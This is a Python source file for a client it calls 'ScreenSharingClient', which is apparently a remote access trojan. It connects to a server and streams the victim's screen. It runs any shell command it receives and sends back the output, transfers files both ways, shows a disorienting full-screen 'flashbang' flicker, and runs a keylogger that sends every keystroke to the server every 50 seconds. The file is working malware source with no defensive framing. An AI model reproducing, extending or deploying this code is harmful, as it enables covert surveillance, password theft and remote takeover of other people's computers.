import socket
import pyautogui
from PIL import Image
import io
import threading
import time
import platform
import tkinter as tk
from tkinter import messagebox as messagebox
import os
import subprocess
from pynput import keyboard
import asyncio
import base64
import random


class ScreenSharingClient:
    # ------------------------------------------------
    # The Client Brain LOL
    # All you need to know is... this works
    # ------------------------------------------------
    def __init__(self, server_ip="localhost", port=5001):
        self.server_ip = server_ip
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.is_screen_sharing = False
        self.screenshot_thread = None
        self.current_directory = os.getcwd()

        self.connect_to_server()

    def connect_to_server(self):
        try:
            self.socket.connect((self.server_ip, self.port))
            print("Connected to server")
            self.start_screen_share()
            threading.Thread(target=self.receive_data).start()
        except Exception as e:
            print(f"Error connecting to server: {e}")
            self.socket.close()

    def receive_data(self):
        try:
            while True:
                # File Communication Handler
                # --------------------------------------------------------------------------------------------------------------------------------
                header = self.socket.recv(4)
                if header == b"FILE":
                    tag = self.socket.recv(5).decode("utf-8")
                    if tag == "fileU":
                        while True:
                            file_name = ""
                            location = ""
                            data_lenght = 0
                            while (
                                received_character := self.socket.recv(1).decode(
                                    "utf-8"
                                )
                            ) != "|":
                                file_name += received_character

                            while (
                                received_character := self.socket.recv(1).decode(
                                    "utf-8"
                                )
                            ) != "|":
                                location += received_character

                            while (
                                received_character := self.socket.recv(1).decode(
                                    "utf-8"
                                )
                            ).isdigit():
                                data_lenght = data_lenght * 10 + int(received_character)
                            break
                        encoded_data = self.socket.recv(data_lenght).decode("utf-8")
                        file_data = base64.b64decode(encoded_data.encode("ascii"))
                        if os.path.exists(location):
                            file_path = os.path.join(location, file_name)
                            with open(file_path, "wb") as f:
                                try:
                                    f.write(file_data)
                                except PermissionError:
                                    self.socket.sendall("F".encode("utf-8"))
                                    self.socket.sendall("fileUp".encode("utf-8"))
                            self.socket.sendall("F".encode("utf-8"))
                            self.socket.sendall("fileUs".encode("utf-8"))
                        else:
                            self.socket.sendall("F".encode("utf-8"))
                            self.socket.sendall("fileUl".encode("utf-8"))
                        continue
                    elif tag == "fileD":
                        while True:
                            file = ""
                            while (
                                received_character := self.socket.recv(1).decode(
                                    "utf-8"
                                )
                            ) != "|":
                                file += received_character
                            break
                        if os.path.exists(file):
                            with open(file, "rb") as fileD:
                                file_data_D = fileD.read()
                                base64FileData = base64.b64encode(file_data_D).decode(
                                    "ascii"
                                )
                            self.socket.sendall("F".encode("utf-8"))
                            self.socket.sendall(
                                f"fileDoincoming{os.path.basename(file)}|{len(base64FileData)} {base64FileData}".encode(
                                    "utf-8"
                                )
                            )
                        else:
                            self.socket.sendall("F".encode("utf-8"))
                            self.socket.sendall("fileDolocation".encode("utf-8"))
                # --------------------------------------------------------------------------------------------------------------------------------
                # Normal Commands:
                command = self.socket.recv(1024).decode("utf-8")
                if command.lower() == "flashbang":
                    try:
                        self.trigger_flashbang()
                    except Exception:
                        pass
                elif command.startswith("message"):
                    message = command[7:]
                    messagebox.showinfo(title="You got a Message", message=message)
                elif command.startswith("CMD"):
                    self.stop_screen_share()
                    cmd = command[3:]
                    output = self.terminal_function(cmd)
                    self.socket.sendall("C".encode("utf-8"))
                    self.socket.sendall(
                        f"{len(output)} [CMDOUT]{output}".encode("utf-8")
                    )
                    self.start_screen_share()
                elif command.lower() == "stop_screenshare":
                    self.stop_screen_share()
                elif command.lower() == "start_screenshare":
                    self.start_screen_share()
        except Exception as e:
            print(f"Error receiving data: {e}")

    def start_screen_share(self):
        if not self.is_screen_sharing:
            self.is_screen_sharing = True
            self.start_screenshot_thread()

    def start_screenshot_thread(self):
        self.screenshot_thread = threading.Thread(target=self.send_screenshot)
        self.screenshot_thread.start()

    def send_screenshot(self):
        try:
            while self.is_screen_sharing:
                screenshot = pyautogui.screenshot()
                buffer = io.BytesIO()
                screenshot.save(buffer, format="JPEG", quality=100)
                data = buffer.getvalue()
                size = len(data)

                # Send the "I" header for image data
                self.socket.sendall("I".encode("utf-8"))
                self.socket.sendall(size.to_bytes(4, "big"))
                self.socket.sendall(data)

                time.sleep(0.001)
        except Exception as e:
            print(f"Error sending screenshot: {e}")

    def terminal_function(self, cmd):
        try:
            if cmd.startswith("cd"):
                new_dir = cmd[3:].strip()
                if new_dir == "/":
                    new_dir = "C:\\" if os.name == "nt" else "/"
                new_dir = os.path.abspath(os.path.join(self.current_directory, new_dir))
                if os.path.isdir(new_dir):
                    os.chdir(new_dir)
                    self.current_directory = new_dir
                    response = f"Directory changed to: {new_dir}"
                else:
                    response = f"Directory not found: {new_dir}"
            else:
                # Execute the command synchronously
                process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    cwd=self.current_directory,
                    text=True,
                )
                stdout, stderr = process.communicate()

                stdout_str = stdout
                stderr_str = stderr
                if process.returncode == 0:
                    response = f"{stdout_str}"
                else:
                    response = f"Error: {stderr_str}"

            return response

        except Exception as e:
            error_message = f"Error: {e}"
            return error_message

    # Code by some guy on stackoverflow
    def randomColor(self):
        return "#" + "".join([random.choice("0123456789ABCDEF") for c in range(6)])

    def trigger_flashbang(self):
        if hasattr(self, "error_box") and self.error_box.winfo_exists():
            return

        self.error_box = tk.Tk()
        randomColor1 = self.randomColor()
        randomColor2 = self.randomColor()
        self.error_box.configure(bg=randomColor1)
        self.error_box.attributes("-topmost", True)
        self.error_box.attributes("-fullscreen", True)
        self.error_box.overrideredirect(True)
        self.error_box.resizable(False, False)

        def colorFlicker():
            try:
                if not self.error_box.winfo_exists():
                    return
                nonlocal randomColor1, randomColor2
                randomColor1 = self.randomColor()
                randomColor2 = self.randomColor()
                self.error_box.configure(bg=randomColor1)
                self.error_box.after(50, colorFlicker)
            except Exception:
                return

        colorFlicker()
        self.error_box.mainloop()

    def stop_screen_share(self):
        if self.is_screen_sharing:
            self.is_screen_sharing = False
            if self.screenshot_thread and self.screenshot_thread.is_alive():
                self.screenshot_thread.join()


class Keylogger:
    def __init__(self):
        self.log = []
        self.lock = threading.Lock()

    def on_press(self, key):
        try:
            char = key.char
            entry = f"Key pressed: {char}"
        except AttributeError:
            entry = f"Special key pressed: {key}"

        with self.lock:
            self.log.append(entry)

    async def send_log(self):
        while True:
            await asyncio.sleep(50)
            with self.lock:
                if self.log:
                    client.stop_screen_share()
                    await asyncio.sleep(5)
                    log_data = "\n".join(self.log)
                    client.socket.sendall("L".encode("utf-8"))
                    client.socket.sendall(
                        f"Logg{len(log_data)}|{log_data}".encode("utf-8")
                    )
                    self.log = []
                    client.start_screen_share()

    def start_key_logger(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()


async def main():
    logger = Keylogger()

    logger_thread = threading.Thread(target=logger.start_key_logger)
    logger_thread.daemon = True
    logger_thread.start()

    await logger.send_log()


if __name__ == "__main__":
    client = ScreenSharingClient()
    asyncio.run(main())
